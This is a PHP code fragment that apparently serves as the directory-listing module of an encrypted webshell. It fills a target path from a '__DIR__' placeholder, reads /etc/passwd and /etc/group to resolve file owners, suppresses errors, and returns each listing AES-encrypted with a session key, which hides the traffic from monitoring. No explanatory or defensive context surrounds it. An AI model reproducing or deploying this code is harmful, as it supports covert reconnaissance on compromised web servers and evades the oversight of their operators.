
function getSafeStr($str)
{
    $s1 = iconv('utf-8', 'gbk//IGNORE', $str);
    $s0 = iconv('gbk', 'utf-8//IGNORE', $s1);
    return ($s0 == $str) ? $s0 : iconv('gbk', 'utf-8//IGNORE', $str);
}
function getPerms($path)
{
    $perms = fileperms($path);
    if (($perms & 0xC000) == 0xC000) {
        $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) {
        $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {
        $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) {
        $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {
        $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {
        $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {
        $info = 'p';
    } else {
        $info = 'u';
    }
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));

    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));

    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}
function uid2user($uid)
{
    $passwd = file_get_contents("/etc/passwd");
    $users = explode("\n", $passwd);
    foreach ($users as $user) {
        $user = explode(":", $user);
        if ($uid === intval($user[2]) )
            return $user[0];
    }
}
function gid2group($gid)
{
    $group = file_get_contents("/etc/group");
    $groups = explode("\n", $group);
    foreach ($groups as $group) {
        $group = explode(":", $group);
        if ($gid === intval($group[2]))
            return $group[0];
    }
}

function listFile($dir)
{
    $result = array();
    $allFiles = scandir($dir);
    foreach ($allFiles as $file) {
        if ($file != "." && $file != "..") {
            $fileArr = array();
            $path = $dir . $file;
            $fileArr["name"] = getSafeStr($file);
            $fileArr["type"] = is_dir($path) ? "dir" : "file";
            $fileArr["size"] = ceil(filesize($path) / 1024);
            $fileArr["mtime"] = date("Y-m-d H:i:s", filemtime($path));
            $fileArr["perms"] = getPerms($path);
            $fileArr["user"] = uid2user(fileowner($path));
            $fileArr["group"] = gid2group(filegroup($path));
            array_push($result, $fileArr);
        }
    }

    return $result;
}

error_reporting(0);
$key = $_SESSION['key'];
session_write_close();
$dir = base64_decode('__DIR__');
$data = array(
    "dir" => $dir,
    "status" => is_readable($dir),
    "files" => listFile($dir)
);
echo openssl_encrypt(base64_encode(json_encode($data)), "aes-256-ecb", $key);
